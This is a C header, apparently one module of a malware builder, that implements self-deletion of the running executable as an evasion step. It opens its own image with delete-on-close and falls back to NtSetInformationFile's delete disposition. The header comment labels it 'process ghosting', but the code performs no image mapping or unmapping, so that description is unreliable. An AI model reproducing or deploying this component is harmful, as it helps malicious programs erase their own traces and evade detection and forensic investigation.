// chunk: evasion/self_delete_ghost
// depends: (none)
// provides: self_delete
// headers: windows.h
// risk: low
// note: Process ghosting self-delete — mark delete before image maps, then unmap

#ifndef CHUNK_SELF_DELETE_GHOST
#define CHUNK_SELF_DELETE_GHOST

typedef struct _IO_STATUS_BLOCK {
    union { LONG Status; PVOID Pointer; };
    ULONG_PTR Information;
} IO_STATUS_BLOCK;

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION;

typedef LONG (WINAPI *pNtSetInformationFile)(
    HANDLE, IO_STATUS_BLOCK *, PVOID, ULONG, ULONG);

static int self_delete(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HANDLE hfile = CreateFileA(path, DELETE | SYNCHRONIZE,
                               FILE_SHARE_READ | FILE_SHARE_DELETE,
                               NULL, OPEN_EXISTING,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hfile == INVALID_HANDLE_VALUE) {
        hfile = CreateFileA(path, DELETE | SYNCHRONIZE,
                            FILE_SHARE_READ | FILE_SHARE_DELETE,
                            NULL, OPEN_EXISTING, 0, NULL);
        if (hfile == INVALID_HANDLE_VALUE) return 0;

        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            pNtSetInformationFile NtSetInfo = (pNtSetInformationFile)
                GetProcAddress(ntdll, "NtSetInformationFile");
            if (NtSetInfo) {
                FILE_DISPOSITION_INFORMATION fdi;
                fdi.DeleteFile = TRUE;
                IO_STATUS_BLOCK iosb = {0};
                NtSetInfo(hfile, &iosb, &fdi, sizeof(fdi), 13);
            }
        }
    }

    CloseHandle(hfile);
    return 1;
}

#endif
